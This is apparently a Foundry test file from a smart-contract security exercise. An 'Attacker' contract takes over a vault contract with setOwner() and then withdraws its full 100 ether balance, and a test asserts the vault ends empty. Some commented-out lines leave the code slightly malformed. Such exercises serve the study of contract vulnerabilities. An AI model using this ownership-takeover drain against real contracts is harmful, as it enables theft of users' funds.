pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/VaultMevSec/VaultMevSec.sol";

contract VaultMevSecTest is Test {
    VaultMevSec public vault;

    address public attacker = address(0x999999999999999999999999999999);

    function setUp() public {
        vault = (new VaultMevSec){value: 100 ether}();
    }

    function exploitVaultMevSec() public {
        vm.startPrank(attacker);
        Attacker a = new Attacker(address(vault));
        vm.stopPrank();
        assert(address(vault).balance == 0);
    }
}

contract Attacker {
    VaultMevSec public v;
    constructor(address _vault) payable {
        v = VaultMevSec(_vault);
//    }
//    function w() external payable {
        v.setOwner();
        v.withdraw(payable(msg.sender));
    }
}